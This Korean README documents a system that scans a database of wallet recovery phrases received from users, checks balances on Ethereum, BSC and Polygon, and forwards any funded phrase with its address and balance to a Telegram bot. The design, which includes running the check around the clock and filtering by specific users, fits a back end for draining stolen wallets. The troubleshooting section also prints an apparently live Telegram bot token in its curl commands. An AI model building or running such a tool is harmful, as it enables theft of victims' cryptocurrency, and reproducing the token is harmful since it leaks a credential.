# 🔍 시드 문구 자동 검수 시스템

## 📋 개요

데이터베이스에 저장된 시드 문구를 자동으로 검수하여 잔고가 있는 지갑을 발견하면 텔레그램으로 시드 문구와 잔고 정보를 전송하는 시스템입니다.

---

## ✨ 주요 기능

- ✅ **자동 DB 스캔**: 30초마다 미검수 시드 문구 자동 조회
- ✅ **멀티체인 지원**: Ethereum, BSC, Polygon 동시 확인
- ✅ **시드 문구 전송**: 잔고 발견 시 시드 문구 포함해서 알림
- ✅ **검수 상태 관리**: 한 번 검수한 시드는 재검수 안 함
- ✅ **순차 처리**: API 레이트 리밋 방지를 위한 순차적 처리
- ✅ **백그라운드 실행**: PM2로 24시간 무중단 운영

---

## 🔧 동작 방식

```
1. DB에서 checked=FALSE인 시드 문구 조회
   ↓
2. 시드 문구로부터 지갑 주소 생성
   ↓
3. Ethereum, BSC, Polygon 잔고 확인
   ↓
4. 잔고가 0 이상인 경우
   ↓
5. 텔레그램 알림 (시드 문구 + 주소 + 잔고)
   ↓
6. checked=TRUE로 업데이트
   ↓
7. 30초 후 다음 시드 검수
```

## 📊 데이터베이스 스키마

### `seeds` 테이블

| 컬럼       | 타입        | 설명                    |
|------------|-------------|-------------------------|
| id         | INT (AI)    | ID (PK)                 |
| user_id    | VARCHAR(50) | 사용자 ID               |
| phrase     | TEXT        | 시드 문구 (12/24 단어)  |
| checked    | BOOLEAN     | 검수 완료 여부          |
| checked_at | DATETIME    | 검수 완료 시각          |
| created_at | TIMESTAMP   | 수신 시각               |

## 🔍 문제 해결

### 잔고 확인이 안 될 때

1. **RPC 엔드포인트 확인**
```bash
curl -X POST https://eth.llamarpc.com \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}'
```

2. **다른 RPC 사용**
```javascript
// Infura (무료 API 키 발급: https://infura.io)
ethereum: 'https://mainnet.infura.io/v3/YOUR_API_KEY'

// Alchemy (무료 API 키 발급: https://alchemy.com)
ethereum: 'https://eth-mainnet.g.alchemy.com/v2/YOUR_API_KEY'
```

### 시드 문구가 유효하지 않을 때

로그에서 다음과 같은 에러가 보이면:
```
❌ 잔고 확인 오류 (ethereum): invalid mnemonic checksum
```

이는 시드 문구가 BIP39 표준을 만족하지 않거나 잘못된 형식입니다.
- 12단어 또는 24단어인지 확인
- 공백으로 구분되어 있는지 확인
- BIP39 단어 목록에 포함된 단어인지 확인

### 텔레그램 알림이 오지 않을 때

1. **봇 토큰 확인**
```bash
curl "https://api.telegram.org/bot8549976717:AAH5_jqcGCHlmZgSBi4nJNxmyVCKQI8HboQ/getMe"
```

2. **채팅 ID 확인**
```bash
curl "https://api.telegram.org/bot8549976717:AAH5_jqcGCHlmZgSBi4nJNxmyVCKQI8HboQ/getUpdates"
```

### DB 연결 오류

```bash
# MariaDB 상태 확인
sudo systemctl status mariadb

# 테이블 확인
```

### 시나리오 2: 실시간 검수

```javascript

```

### 시나리오 3: 특정 사용자만 검수

`getUncheckedSeeds()` 함수 수정:
```javascript
const [rows] = await db.pool.query(
  `SELECT id, user_id, phrase, created_at 
   FROM seeds 
   WHERE (checked IS NULL OR checked = FALSE) 
   AND user_id = 'specific_user'
   ORDER BY created_at ASC 
   LIMIT ?`,
  [CONFIG.BATCH_SIZE]
);
```
